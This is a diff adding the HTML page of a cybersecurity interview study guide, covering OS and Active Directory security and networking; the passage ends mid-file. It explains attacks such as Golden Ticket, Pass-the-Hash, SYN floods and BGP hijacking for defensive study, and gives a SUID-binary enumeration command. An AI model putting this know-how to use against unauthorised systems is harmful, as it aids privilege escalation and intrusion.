@@ -1,0 +1,1125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cybersecurity Study Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@400;500&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#0a0c10;
+  --surface:#111418;
+  --card:#161b22;
+  --border:#1e2530;
+  --border2:#252d3a;
+  --accent:#00d4aa;
+  --accent2:#0099ff;
+  --accent3:#ff6b35;
+  --text:#e8edf5;
+  --muted:#7a8799;
+  --muted2:#4a5568;
+  --easy:#22c55e;
+  --med:#f59e0b;
+  --hard:#ef4444;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:'DM Sans',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}
+
+/* ── HERO ── */
+.hero{
+  position:relative;
+  padding:80px 40px 60px;
+  text-align:center;
+  overflow:hidden;
+}
+.hero::before{
+  content:'';
+  position:absolute;inset:0;
+  background:radial-gradient(ellipse 80% 60% at 50% 0%, rgba(0,212,170,.08) 0%, transparent 70%),
+              radial-gradient(ellipse 40% 40% at 20% 80%, rgba(0,153,255,.05) 0%, transparent 60%);
+  pointer-events:none;
+}
+.hero-badge{
+  display:inline-block;
+  font-family:'DM Mono',monospace;
+  font-size:11px;letter-spacing:.15em;
+  color:var(--accent);
+  border:1px solid rgba(0,212,170,.25);
+  background:rgba(0,212,170,.06);
+  padding:5px 14px;border-radius:20px;
+  margin-bottom:24px;text-transform:uppercase;
+}
+.hero h1{
+  font-family:'Syne',sans-serif;
+  font-size:clamp(36px,6vw,68px);
+  font-weight:800;
+  line-height:1.05;
+  letter-spacing:-1px;
+  margin-bottom:16px;
+}
+.hero h1 span{color:var(--accent)}
+.hero p{
+  font-size:16px;color:var(--muted);
+  max-width:560px;margin:0 auto 40px;
+  line-height:1.7;
+}
+.stats-row{
+  display:flex;gap:0;justify-content:center;
+  border:1px solid var(--border);
+  border-radius:12px;
+  max-width:520px;margin:0 auto;
+  overflow:hidden;background:var(--surface);
+}
+.stat{flex:1;padding:20px 16px;text-align:center;position:relative}
+.stat+.stat{border-left:1px solid var(--border)}
+.stat-num{
+  font-family:'Syne',sans-serif;font-size:28px;font-weight:800;
+  color:var(--accent);display:block;
+}
+.stat-lbl{font-size:11px;color:var(--muted);letter-spacing:.05em;text-transform:uppercase;margin-top:2px}
+
+/* ── SEARCH ── */
+.search-wrap{padding:0 40px 20px;max-width:900px;margin:0 auto}
+.search-box{
+  display:flex;align-items:center;gap:12px;
+  background:var(--surface);border:1px solid var(--border2);
+  border-radius:10px;padding:12px 16px;
+}
+.search-box svg{flex-shrink:0;color:var(--muted)}
+.search-box input{
+  background:none;border:none;outline:none;
+  color:var(--text);font-family:'DM Sans',sans-serif;font-size:14px;
+  width:100%;
+}
+.search-box input::placeholder{color:var(--muted2)}
+
+/* ── CHAPTERS GRID ── */
+.main{padding:0 40px 80px;max-width:1200px;margin:0 auto}
+.section-label{
+  font-family:'DM Mono',monospace;font-size:11px;
+  letter-spacing:.12em;text-transform:uppercase;
+  color:var(--muted);margin-bottom:20px;
+  display:flex;align-items:center;gap:10px;
+}
+.section-label::after{content:'';flex:1;height:1px;background:var(--border)}
+
+.chapters-grid{
+  display:grid;
+  grid-template-columns:repeat(auto-fill,minmax(340px,1fr));
+  gap:2px;
+  border:1px solid var(--border);border-radius:14px;
+  overflow:hidden;margin-bottom:4px;
+}
+
+/* ── CHAPTER CARD ── */
+.chapter{background:var(--surface);transition:background .2s}
+.chapter.hidden{display:none}
+.chapter-header{
+  display:flex;align-items:flex-start;gap:16px;
+  padding:20px;cursor:pointer;
+  border-bottom:1px solid transparent;
+  transition:all .2s;user-select:none;
+}
+.chapter.open .chapter-header{border-bottom-color:var(--border)}
+.chapter-header:hover{background:var(--card)}
+.ch-num{
+  font-family:'Syne',sans-serif;font-size:11px;font-weight:700;
+  color:var(--accent);letter-spacing:.08em;
+  background:rgba(0,212,170,.08);border:1px solid rgba(0,212,170,.2);
+  border-radius:6px;padding:4px 8px;flex-shrink:0;margin-top:2px;
+  white-space:nowrap;
+}
+.ch-info{flex:1;min-width:0}
+.ch-title{font-family:'Syne',sans-serif;font-size:15px;font-weight:700;line-height:1.3;margin-bottom:6px}
+.ch-desc{font-size:12px;color:var(--muted);line-height:1.5}
+.ch-tags{display:flex;flex-wrap:wrap;gap:5px;margin-top:8px}
+.ch-tag{
+  font-size:10px;letter-spacing:.04em;
+  padding:2px 7px;border-radius:20px;
+  background:rgba(255,255,255,.04);border:1px solid var(--border2);
+  color:var(--muted);
+}
+.ch-arrow{
+  flex-shrink:0;margin-top:3px;color:var(--muted);
+  transition:transform .3s;font-size:14px;
+}
+.chapter.open .ch-arrow{transform:rotate(180deg)}
+
+/* ── CHAPTER BODY ── */
+.chapter-body{display:none;padding:0}
+.chapter.open .chapter-body{display:block}
+
+/* TABS */
+.tabs{display:flex;background:var(--card);border-bottom:1px solid var(--border)}
+.tab-btn{
+  flex:1;padding:12px 8px;font-size:12px;font-weight:500;
+  letter-spacing:.04em;cursor:pointer;border:none;
+  background:none;color:var(--muted);transition:all .2s;
+  border-bottom:2px solid transparent;margin-bottom:-1px;
+  font-family:'DM Sans',sans-serif;
+}
+.tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
+.tab-btn:hover:not(.active){color:var(--text)}
+
+.tab-panel{display:none;padding:20px}
+.tab-panel.active{display:block}
+
+/* SUMMARY CARDS */
+.sum-cards{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:16px}
+.sum-card{
+  background:var(--bg);border:1px solid var(--border);
+  border-radius:8px;padding:12px;
+}
+.sum-card-title{font-size:12px;font-weight:600;margin-bottom:5px;color:var(--text)}
+.sum-card-text{font-size:11.5px;color:var(--muted);line-height:1.6}
+
+/* DEEP DIVE sections */
+.dive-block{
+  border:1px solid var(--border);border-radius:8px;
+  overflow:hidden;margin-bottom:8px;
+}
+.dive-head{
+  display:flex;justify-content:space-between;align-items:center;
+  padding:10px 14px;background:var(--bg);cursor:pointer;
+  font-size:12.5px;font-weight:600;
+}
+.dive-head:hover{background:rgba(255,255,255,.02)}
+.dive-arrow{font-size:12px;color:var(--muted);transition:transform .25s}
+.dive-block.open .dive-arrow{transform:rotate(180deg)}
+.dive-body{display:none;padding:12px 14px;border-top:1px solid var(--border)}
+.dive-block.open .dive-body{display:block}
+.dive-body p{font-size:12px;color:var(--muted);line-height:1.7;margin-bottom:8px}
+.dive-body p:last-child{margin:0}
+
+/* TERMS */
+.terms-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.term-card{
+  background:var(--bg);border:1px solid var(--border);
+  border-radius:8px;padding:11px 13px;
+}
+.term-badge{
+  display:inline-block;font-size:9px;font-weight:600;
+  letter-spacing:.06em;text-transform:uppercase;
+  padding:2px 7px;border-radius:20px;margin-bottom:6px;
+}
+.term-name{font-size:12.5px;font-weight:600;margin-bottom:4px}
+.term-def{font-size:11.5px;color:var(--muted);line-height:1.55}
+
+/* QUESTIONS */
+.q-list{display:flex;flex-direction:column;gap:6px}
+.q-item{
+  border:1px solid var(--border);border-radius:8px;overflow:hidden;
+}
+.q-head{
+  display:flex;align-items:flex-start;gap:10px;
+  padding:11px 14px;cursor:pointer;background:var(--bg);
+  transition:background .15s;
+}
+.q-head:hover{background:rgba(255,255,255,.02)}
+.q-num{
+  display:flex;align-items:center;justify-content:center;
+  width:20px;height:20px;border-radius:50%;
+  background:var(--surface);border:1px solid var(--border2);
+  font-size:10px;font-weight:600;color:var(--muted);
+  flex-shrink:0;margin-top:1px;
+}
+.q-text{font-size:12.5px;flex:1;line-height:1.5}
+.q-diff{
+  font-size:9px;font-weight:600;letter-spacing:.06em;text-transform:uppercase;
+  padding:2px 7px;border-radius:20px;flex-shrink:0;margin-top:2px;
+}
+.easy{color:var(--easy);background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.2)}
+.med{color:var(--med);background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.2)}
+.hard{color:var(--hard);background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.2)}
+.q-toggle{font-size:12px;color:var(--muted);flex-shrink:0;margin-top:2px;transition:transform .25s}
+.q-item.open .q-toggle{transform:rotate(180deg)}
+.q-answer{display:none;padding:12px 14px;border-top:1px solid var(--border);background:var(--card)}
+.q-item.open .q-answer{display:block}
+.q-answer p{font-size:12px;color:var(--muted);line-height:1.7;margin-bottom:8px}
+.q-answer p:last-child{margin:0}
+.q-answer strong{color:var(--text)}
+
+/* BADGE COLORS */
+.b-net{background:rgba(0,153,255,.1);color:#4db8ff;border:1px solid rgba(0,153,255,.2)}
+.b-os{background:rgba(139,92,246,.1);color:#a78bfa;border:1px solid rgba(139,92,246,.2)}
+.b-sec{background:rgba(0,212,170,.1);color:var(--accent);border:1px solid rgba(0,212,170,.2)}
+.b-web{background:rgba(245,158,11,.1);color:#fbbf24;border:1px solid rgba(245,158,11,.2)}
+.b-cloud{background:rgba(59,130,246,.1);color:#60a5fa;border:1px solid rgba(59,130,246,.2)}
+.b-att{background:rgba(239,68,68,.1);color:#f87171;border:1px solid rgba(239,68,68,.2)}
+.b-edr{background:rgba(16,185,129,.1);color:#34d399;border:1px solid rgba(16,185,129,.2)}
+.b-siem{background:rgba(99,102,241,.1);color:#818cf8;border:1px solid rgba(99,102,241,.2)}
+.b-aware{background:rgba(236,72,153,.1);color:#f472b6;border:1px solid rgba(236,72,153,.2)}
+.b-law{background:rgba(245,158,11,.1);color:#fcd34d;border:1px solid rgba(245,158,11,.2)}
+.b-code{background:rgba(16,185,129,.1);color:#6ee7b7;border:1px solid rgba(16,185,129,.2)}
+
+/* PROGRESS BAR */
+.progress-bar{
+  height:2px;background:var(--border);border-radius:1px;margin-bottom:24px;
+}
+.progress-fill{
+  height:100%;border-radius:1px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  width:0;transition:width .5s ease;
+}
+
+/* NO RESULTS */
+.no-results{
+  text-align:center;padding:60px 20px;color:var(--muted);
+  display:none;
+}
+.no-results.show{display:block}
+
+/* SCROLL TO TOP */
+.scroll-top{
+  position:fixed;bottom:24px;right:24px;
+  width:40px;height:40px;border-radius:50%;
+  background:var(--surface);border:1px solid var(--border2);
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;color:var(--muted);transition:all .2s;
+  opacity:0;pointer-events:none;z-index:100;
+}
+.scroll-top.show{opacity:1;pointer-events:all}
+.scroll-top:hover{border-color:var(--accent);color:var(--accent)}
+
+/* RESPONSIVE */
+@media(max-width:680px){
+  .hero{padding:60px 20px 40px}
+  .main,.search-wrap{padding-left:16px;padding-right:16px}
+  .chapters-grid{grid-template-columns:1fr}
+  .sum-cards,.terms-grid{grid-template-columns:1fr}
+  .stats-row{max-width:100%}
+}
+</style>
+</head>
+<body>
+
+<div class="hero">
+  <div class="hero-badge">&#9632; Cybersecurity Essentials — Complete Study Guide</div>
+  <h1>Master Every<br><span>Chapter.</span> Ace Every<br>Interview.</h1>
+  <p>15 chapters. 150 questions. All the key terms and deep dives you need for SOC Analyst, Cybersecurity Analyst, and InfoSec roles.</p>
+  <div class="stats-row">
+    <div class="stat"><span class="stat-num">15</span><span class="stat-lbl">Chapters</span></div>
+    <div class="stat"><span class="stat-num">150</span><span class="stat-lbl">Questions</span></div>
+    <div class="stat"><span class="stat-num">200+</span><span class="stat-lbl">Key Terms</span></div>
+    <div class="stat"><span class="stat-num">3</span><span class="stat-lbl">Tabs Each</span></div>
+  </div>
+</div>
+
+<div class="search-wrap">
+  <div class="search-box">
+    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+    <input type="text" id="searchInput" placeholder="Search chapters, topics, terms…" oninput="filterChapters()">
+  </div>
+</div>
+
+<div class="main">
+  <div class="section-label">All Chapters</div>
+  <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+
+  <div class="chapters-grid" id="chaptersGrid">
+
+<!-- ═══════════════════════════════════════════════════════════
+     CHAPTER 1
+═══════════════════════════════════════════════════════════ -->
+<div class="chapter" data-search="unix linux windows os shells kerberos ntlm active directory ssh ftp">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 01</span>
+    <div class="ch-info">
+      <div class="ch-title">UNIX, Linux &amp; Windows</div>
+      <div class="ch-desc">OS fundamentals, shells, SSH hardening, file permissions, Active Directory, NTLM vs Kerberos, and AD attacks.</div>
+      <div class="ch-tags">
+        <span class="ch-tag">OS Security</span><span class="ch-tag">Active Directory</span><span class="ch-tag">Kerberos</span><span class="ch-tag">SSH</span>
+      </div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">Shells</div><div class="sum-card-text">Bourne, Bash, C, Korn, Z shells. Bash is default on most Linux distros. Shells interpret commands and run scripts. Critical for automation and red/blue team operations.</div></div>
+        <div class="sum-card"><div class="sum-card-title">SSH Hardening</div><div class="sum-card-text">Disable Telnet/rhosts/root login. Use public key auth, privilege separation. Edit sshd_config. Replace FTP with SFTP or FTPS.</div></div>
+        <div class="sum-card"><div class="sum-card-title">File Permissions</div><div class="sum-card-text">chmod rwx / octal notation. r=4, w=2, x=1. SUID bit allows users to run with file owner's privileges — common privilege escalation vector.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Active Directory</div><div class="sum-card-text">Domains, Domain Controllers, forests, trusts, SID/RID, FQDN, Global Catalog. Foundation of Windows enterprise identity management.</div></div>
+        <div class="sum-card"><div class="sum-card-title">NTLM vs Kerberos</div><div class="sum-card-text">NTLM is challenge-response, legacy, vulnerable to pass-the-hash. Kerberos uses TGT/TGS/KDC ticket flow. Modern default for domain authentication.</div></div>
+        <div class="sum-card"><div class="sum-card-title">AD Attacks</div><div class="sum-card-text">Pass-the-Hash exploits NTLM. Golden Ticket forges TGT using krbtgt hash (unlimited domain access). Silver Ticket forges TGS for a specific service.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-os">OS</span><div class="term-name">Kernel</div><div class="term-def">Core of the OS managing hardware, memory, and processes. User programs interact with the kernel via system calls.</div></div>
+        <div class="term-card"><span class="term-badge b-os">OS</span><div class="term-name">SSH (Secure Shell)</div><div class="term-def">Encrypted protocol for remote system management. Replaces Telnet. Uses public/private key pairs for passwordless authentication.</div></div>
+        <div class="term-card"><span class="term-badge b-sec">AD</span><div class="term-name">Kerberos TGT/TGS</div><div class="term-def">Ticket Granting Ticket issued by KDC. User presents TGT to get a Ticket Granting Service (TGS) for specific resources.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">Pass-the-Hash</div><div class="term-def">Using a stolen NTLM hash to authenticate without knowing the plaintext password. Exploits NTLM challenge-response weakness.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">Golden Ticket</div><div class="term-def">Forged TGT created using the krbtgt account hash. Grants full domain persistence. Detected by monitoring krbtgt password resets.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">Silver Ticket</div><div class="term-def">Forged TGS for a specific service. Requires service account hash. More limited than Golden Ticket but harder to detect.</div></div>
+        <div class="term-card"><span class="term-badge b-os">OS</span><div class="term-name">SUID Bit</div><div class="term-def">Special file permission that lets users execute a file with the file owner's permissions. Common privilege escalation vector when set on writable scripts.</div></div>
+        <div class="term-card"><span class="term-badge b-os">OS</span><div class="term-name">SID / RID</div><div class="term-def">Security Identifier (SID) uniquely identifies users/groups in Windows. RID is the relative portion — Administrator always has RID 500.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">What is the difference between NTLM and Kerberos authentication?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>NTLM is a legacy challenge-response protocol. Server sends a challenge, client responds with the user's NT hash applied to the challenge. No central validation — each server verifies independently. Vulnerable to pass-the-hash attacks because an attacker with the hash can authenticate without the password.</p><p>Kerberos is the modern default. Client authenticates to the KDC (Domain Controller) and receives a Ticket Granting Ticket (TGT). To access a service, the client presents the TGT to get a service-specific TGS. The target server validates the TGS without ever seeing the password or hash. Single sign-on across services. Mutual authentication (client and server verify each other). Much more resistant to credential theft attacks.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is a Golden Ticket attack and how is it detected?</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>A Golden Ticket is a forged Kerberos TGT created using the krbtgt account's NTLM hash. Because the KDC signs all TGTs with krbtgt, possessing this hash lets an attacker forge valid TGTs for any user, including fabricated users, with any group memberships, for any duration (even 10 years). This grants persistent, unlimited domain access even after passwords are reset — because the ticket is self-validating.</p><p>Detection: Golden Tickets often have impossible characteristics — ticket lifetimes exceeding the domain policy maximum (10 hours default), tickets for users that don't exist, or tickets with group memberships not matching the user's actual memberships. Monitor for Event ID 4769 (TGS requests) from accounts not recently authenticated via normal means. The definitive remediation is resetting krbtgt twice (to invalidate all outstanding tickets) — the second reset invalidates tickets created after the first reset using the old hash.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">How would you harden an SSH configuration?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Key sshd_config changes: disable root login (PermitRootLogin no), disable password auth in favor of key-based auth (PasswordAuthentication no), disable empty passwords, disable rhosts/host-based auth, enable privilege separation (UsePrivilegeSeparation yes), restrict which users can SSH in (AllowUsers or AllowGroups), change default port from 22 (minor obscurity benefit), limit authentication attempts (MaxAuthTries 3), and set an idle timeout (ClientAliveInterval 300, ClientAliveCountMax 0).</p><p>Additionally: use fail2ban or similar to block brute-force attempts, rotate SSH keys regularly, use ed25519 or RSA-4096 key pairs (not DSA), configure firewall rules to limit SSH access to specific source IPs where possible, and monitor SSH authentication logs (/var/log/auth.log) for unusual patterns.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">4</div><div class="q-text">What is the SUID bit and why is it a privilege escalation risk?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>The SUID (Set User ID) bit is a special Unix permission. When set on an executable, that program runs with the file owner's privileges rather than the executing user's privileges. Legitimate use: passwd is owned by root with SUID set, so regular users can change their own passwords (which requires writing to /etc/shadow, normally root-only).</p><p>Privilege escalation risk: if an attacker finds a SUID binary owned by root that has a vulnerability (command injection, path manipulation, library injection) or is writable, they can execute code with root privileges. Classic example: a SUID shell script that calls external commands without full paths — attacker manipulates PATH to make the shell execute a malicious binary instead. Find SUID files: find / -perm -4000 -user root 2>/dev/null. Any unexpected SUID binary, especially in user-writable locations, is a critical finding.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">5</div><div class="q-text">What is Active Directory and what are its core components?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>Active Directory (AD) is Microsoft's directory service for Windows domain networks. It centralizes authentication and authorization for all domain-joined systems. Core components: Domain — logical group of objects (users, computers, groups) sharing a directory. Domain Controller (DC) — server running AD DS, stores the directory database, authenticates users. Forest — collection of domains with shared schema and configuration. Trust — relationship allowing authentication between domains. Organizational Unit (OU) — container within a domain for organizing objects and applying Group Policy.</p><p>Key concepts: FQDN (Fully Qualified Domain Name) identifies domain resources. Global Catalog — distributed data repository containing partial replica of all objects in the forest, enabling forest-wide searches. SID (Security Identifier) — unique identifier for every user, group, and computer. Group Policy — mechanism for enforcing configuration and security settings across all domain members. AD is a critical attack target because compromising a Domain Controller effectively compromises the entire organization.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
+     CHAPTER 2
+═══════════════════════════════════════════════════════════ -->
+<div class="chapter" data-search="networking osi tcp udp routing protocols firewalls iptables subnetting">
+  <div class="chapter-header" onclick="toggleChapter(this)">
+    <span class="ch-num">Ch 02</span>
+    <div class="ch-info">
+      <div class="ch-title">Networking, Routing &amp; Protocols</div>
+      <div class="ch-desc">OSI model, TCP/IP, routing protocols, IP addressing, subnetting, iptables, and network-level attacks.</div>
+      <div class="ch-tags">
+        <span class="ch-tag">OSI Model</span><span class="ch-tag">TCP/UDP</span><span class="ch-tag">Routing</span><span class="ch-tag">Firewalls</span>
+      </div>
+    </div>
+    <span class="ch-arrow">▼</span>
+  </div>
+  <div class="chapter-body">
+    <div class="tabs">
+      <button class="tab-btn active" onclick="switchTab(this,'sum')">Summary</button>
+      <button class="tab-btn" onclick="switchTab(this,'terms')">Key Terms</button>
+      <button class="tab-btn" onclick="switchTab(this,'qs')">Interview Qs</button>
+    </div>
+    <div class="tab-panel active" data-tab="sum">
+      <div class="sum-cards">
+        <div class="sum-card"><div class="sum-card-title">OSI 7 Layers</div><div class="sum-card-text">Physical, Data Link, Network, Transport, Session, Presentation, Application. Each layer has characteristic attacks — ARP spoofing at L2, IP spoofing at L3, SYN flood at L4.</div></div>
+        <div class="sum-card"><div class="sum-card-title">TCP vs UDP</div><div class="sum-card-text">TCP: connection-oriented, 3-way handshake (SYN/SYN-ACK/ACK), reliable delivery. UDP: connectionless, no guarantee, used for speed (DNS, video). SYN flood exhausts connection table.</div></div>
+        <div class="sum-card"><div class="sum-card-title">Routing Protocols</div><div class="sum-card-text">RIP (hop count), OSPF (link-state, large networks), EIGRP (Cisco proprietary), BGP (internet routing between ASes), IS-IS. All vulnerable to poisoning attacks.</div></div>
+        <div class="sum-card"><div class="sum-card-title">IP Addressing</div><div class="sum-card-text">Class A (10.x), B (172.16–31.x), C (192.168.x). CIDR notation for variable-length subnets. Subnet masks define network vs host portions.</div></div>
+        <div class="sum-card"><div class="sum-card-title">iptables</div><div class="sum-card-text">Linux firewall tool. Three main chains: INPUT, OUTPUT, FORWARD. Rules processed top-to-bottom. DROP vs REJECT (DROP is silent, REJECT sends error back).</div></div>
+        <div class="sum-card"><div class="sum-card-title">TCP Flags</div><div class="sum-card-text">SYN (initiate), ACK (acknowledge), FIN (close gracefully), RST (reset immediately), PSH (push data), URG (urgent). Flag combinations identify scan types in Nmap.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="terms">
+      <div class="terms-grid">
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">3-Way Handshake</div><div class="term-def">TCP connection setup: Client → SYN → Server; Server → SYN-ACK → Client; Client → ACK → Server. SYN flood attack sends thousands of SYNs without completing the handshake.</div></div>
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">BGP (Border Gateway Protocol)</div><div class="term-def">Path-vector routing protocol used between autonomous systems on the internet. BGP hijacking redirects traffic by announcing false routes, enabling interception at scale.</div></div>
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">OSPF</div><div class="term-def">Link-state routing protocol. Routers share topology maps and calculate shortest paths. Scalable for large enterprise networks. Vulnerable to route injection attacks.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">SYN Flood</div><div class="term-def">DoS attack sending mass TCP SYN packets without completing handshakes. Exhausts server's half-open connection table. Mitigated by SYN cookies.</div></div>
+        <div class="term-card"><span class="term-badge b-att">Attack</span><div class="term-name">ARP Spoofing</div><div class="term-def">Sending fake ARP replies to associate attacker's MAC with a legitimate IP. Enables MITM attacks on local networks. Defended by Dynamic ARP Inspection (DAI).</div></div>
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">CIDR Notation</div><div class="term-def">Classless Inter-Domain Routing. E.g., 192.168.1.0/24 means first 24 bits are network, last 8 bits are hosts (256 addresses). Replaced classful addressing.</div></div>
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">iptables DROP vs REJECT</div><div class="term-def">DROP silently discards packets — sender gets no response (stealth). REJECT discards and sends ICMP error back to sender — sender knows the connection was refused.</div></div>
+        <div class="term-card"><span class="term-badge b-net">Network</span><div class="term-name">UDP</div><div class="term-def">Connectionless, no handshake, no delivery guarantee. Used where speed matters over reliability: DNS (port 53), DHCP, VoIP, streaming. Cannot be SYN-flooded.</div></div>
+      </div>
+    </div>
+    <div class="tab-panel" data-tab="qs">
+      <div class="q-list">
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">1</div><div class="q-text">Explain the OSI model and give an example of an attack at each layer.</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p><strong>L1 Physical:</strong> Cable cutting, jamming, hardware implants. <strong>L2 Data Link:</strong> ARP spoofing (MITM on LAN), MAC flooding (CAM table overflow turning switch into hub), VLAN hopping. <strong>L3 Network:</strong> IP spoofing, ICMP redirect attacks, BGP/OSPF route poisoning. <strong>L4 Transport:</strong> SYN flood (TCP DoS), session hijacking using predicted sequence numbers. <strong>L5 Session:</strong> Session fixation, session hijacking. <strong>L6 Presentation:</strong> SSL stripping, malformed SSL/TLS attacks. <strong>L7 Application:</strong> SQL injection, XSS, buffer overflow in application logic, phishing.</p><p>The key insight interviewers want: attacks at lower layers affect all higher-layer traffic passing through. An L2 ARP spoof lets you intercept L7 HTTP traffic. Understanding which layer an attack targets helps select the right defensive control.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">2</div><div class="q-text">What is a SYN flood and how do SYN cookies defend against it?</div><span class="q-diff med">Medium</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>A SYN flood sends massive numbers of TCP SYN packets to a target server, often with spoofed source IPs. The server allocates resources for each half-open connection (waiting for the final ACK), stores them in a backlog queue, and waits for completion. The attacker never sends the final ACK, so the half-open connections accumulate until the backlog is exhausted. New legitimate connections are then refused.</p><p>SYN cookies: instead of storing state for each SYN, the server encodes the connection information into the initial sequence number (the SYN-ACK). If the client completes the handshake with a valid ACK (containing data derived from the cookie), the server reconstructs the state at that point. Legitimate clients always complete the handshake. Attackers using spoofed IPs never receive the SYN-ACK and can't respond. This allows the server to handle massive SYN floods without exhausting memory.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">3</div><div class="q-text">What is the difference between TCP and UDP, and when would you use each?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>TCP (Transmission Control Protocol) is connection-oriented. It establishes a connection via 3-way handshake, guarantees delivery and order of packets, performs flow control and congestion control, and detects/retransmits lost packets. Use TCP when data integrity matters: web (HTTP/HTTPS), email (SMTP), file transfers (FTP), remote access (SSH).</p><p>UDP (User Datagram Protocol) is connectionless — no handshake, no delivery guarantee, no ordering, no retransmission. Just sends packets as fast as possible. Use UDP when speed matters more than perfect delivery: DNS lookups, streaming video/audio (a dropped frame is better than delayed playback), VoIP, online gaming, DHCP. Security note: UDP's stateless nature makes it harder to track for stateful firewalls and used in amplification DDoS attacks (small UDP request → large response sent to spoofed victim IP).</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">4</div><div class="q-text">Explain BGP hijacking and why it's dangerous.</div><span class="q-diff hard">Hard</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>BGP (Border Gateway Protocol) is the routing protocol that governs how traffic moves between autonomous systems (AS) on the internet. It fundamentally trusts route announcements — any AS can announce that it owns any IP prefix. BGP hijacking occurs when a malicious (or misconfigured) AS announces false ownership of IP prefixes it doesn't control. Other routers, following BGP's preference for more specific routes or shorter paths, update their routing tables to send traffic through the attacker's AS.</p><p>Why it's dangerous: traffic intended for a bank or government site can be redirected to an attacker who can then: eavesdrop (if not encrypted), perform MITM attacks on TLS by presenting fraudulent certificates, drop traffic (DoS), or manipulate content. Historical examples: the Pakistan Telecom/YouTube incident (2008), where Pakistan's route blackholing accidentally propagated globally. BGPsec and RPKI (Resource Public Key Infrastructure) are designed to cryptographically verify route ownership, but adoption is still incomplete globally.</p></div></div>
+        <div class="q-item"><div class="q-head" onclick="toggleQ(this)"><div class="q-num">5</div><div class="q-text">What does /24 mean in CIDR notation and how many hosts can it have?</div><span class="q-diff easy">Easy</span><span class="q-toggle">▼</span></div><div class="q-answer"><p>/24 means the first 24 bits of the IP address are the network portion, and the remaining 8 bits are for host addresses. Example: 192.168.1.0/24 = network 192.168.1.x. With 8 host bits: 2^8 = 256 total addresses. Subtract 2 (network address 192.168.1.0 and broadcast address 192.168.1.255) = 254 usable host addresses.</p><p>Common CIDR: /8 = Class A (~16M hosts), /16 = Class B (~65K hosts), /24 = Class C (254 hosts), /30 = point-to-point link (2 hosts), /32 = single host. Subnetting divides a larger network into smaller segments. For example, 192.168.0.0/22 covers 192.168.0.0 through 192.168.3.255 = 1022 hosts. Understanding subnetting is essential for network segmentation (PCI-DSS, isolating cardholder data environments) and firewall rule scoping.</p></div></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════
